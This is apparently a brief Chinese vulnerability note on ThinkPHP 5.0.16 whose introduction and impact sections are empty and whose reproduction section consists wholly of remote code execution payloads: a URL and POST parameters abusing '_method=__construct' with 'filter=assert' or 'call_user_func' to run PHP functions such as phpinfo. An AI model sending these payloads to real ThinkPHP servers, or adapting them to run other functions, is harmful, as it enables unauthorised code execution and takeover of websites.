# Thinkphp 5.0.16

### 一、漏洞简介

### 二、漏洞影响

### 三、复现过程


```
http://url/index.php?=captcha.php

s=phpinfo()&_method=__construct&filter=assert
_method=__construct&method=get&filter[]=call_user_func&server[]=phpinfo&get[]=phpinfo
_method=__construct&method=get&filter[]=call_user_func&get[]=phpinfo
_method=__construct&method=get&filter[]=call_user_func&get[0]=phpinfo&get[1]=1
```